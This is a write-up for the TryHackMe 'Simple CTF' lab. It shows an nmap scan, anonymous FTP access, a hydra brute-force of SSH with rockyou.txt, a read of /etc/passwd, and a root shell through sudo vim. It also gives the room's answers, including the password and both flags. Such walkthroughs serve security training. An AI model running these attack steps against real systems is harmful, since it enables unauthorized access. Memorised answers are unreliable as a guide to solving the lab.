# Simple CTF - TryHackMe Writeup 🚩
**Platform:** [TryHackMe](https://tryhackme.com/room/easyctf)
**Difficulty:** Easy

## Answer the questions below
  **How many services are running under port 1000?** *[2]*
  
      ``` sudo nmap -sV -p 1-1001 10.112.129.59
          PORT   STATE SERVICE VERSION
          21/tcp open  ftp     vsftpd 3.0.3
          80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
          Service Info: OS: Unix ```


  **What is running on the higher port?** *[SSH]*
  
    ``` sudo nmap -sV -p- 10.112.129.59
        PORT     STATE SERVICE VERSION
        21/tcp   open  ftp     vsftpd 3.0.3
        80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
        2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ```

  **What's the CVE you're using against the application?** *[CVE-2019–9053]*
  
     ``` Start Fuzz Dir , Found Dir name = Simple , after found the dir open site http://10.112.129.59/simple  , and see last page found version [by Made Simple Version 2.2.8]
         copy the version and search in google , what CVE "CMS 2.2.8"   
     
      ``` 

 **To what kind of vulnerability is the application vulnerable?** *[SQLI]*

 ### Now We Try Login  Way FTP :
 
    ```
      ftp 10.114.170.115
           Connected to 10.114.170.115.
           220 (vsFTPd 3.0.3)
           Name (10.114.170.115:t3sla):
           530 This FTP server is anonymous only.
           ftp: Login failed
         
       👉 Try Login with anonymous 
    ftp 10.114.170.115
           Connected to 10.114.170.115.
           220 (vsFTPd 3.0.3)
           Name (10.114.170.115:t3sla): anonymous
           230 Login successful.
           Remote system type is UNIX.
          Using binary mode to transfer files.  👉While you are trying to enter FTP, a specific file is being transferred, now how do we obtain this file 👈

      🔦 Using Wget to get data transfer 
    wget -m --no-passive   ftp://anonymous@10.114.170.115
      we see name file == ForMitch.txt  💡 Point - The data in file it is Massage Directed to a person : The Name Person🕵 mitch 
     
    ```   

 ### Try Login SSH  :
 
    ```
     sudo hydra -l mitch -P rockyou.txt ssh://10.114.170.115:2222
            Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws               and ethics anyway).
              Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 18:41:15
              [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
              [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
              [DATA] attacking ssh://10.114.170.115:2222/
              [2222][ssh] host: 10.114.170.115   login: mitch   password: secret 🏳
              1 of 1 target successfully completed, 1 valid password found
              Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 18:41:28`**
     ``` 
  **What's the password? *[secret]*

  **Where can you login with the details obtained?** *[SSH]* 

  **What's the user flag?** *[G00d j0b, keep up!]*
       
    ```
     ssh mitch@10.114.170.115   -p 2222    🔛 After Login Found File Flag 
       $ ls 
       $ user.txt 
       $ cat user.txt 
       $ G00d j0b, keep up!
    ```
  **Is there any other user in the home directory? What's its name?** *[sunbath]*

     ```
     cat /etc/passwd  ⚠ In Here Found Name user and Dir Home 
     ```

  ### privilege Escalation  
  
   **What can you leverage to spawn a privileged shell?** *[vim]*
     
     ```
      sudo -l    ✋  If you want to get high permissions, just try this command, take the services that work with root permissions, and search GTFOBins
        (root) NOPASSWD: /usr/bin/vim 
         1- Access Shell root By Vim
         2- Open Vim by sudo 
         sudo /usr/bin/vim 
         
         3- in vim write 👉 :!/bin/sh
     ```
  **What's the root flag?** *[W3ll d0n3. You made it!]*
       
     ```
      cd /root
      cat root.txt
      [W3ll d0n3. You made it!
      ```
# -----


                                                                 ```  ✍ Tesla    ```
                                                                           👋
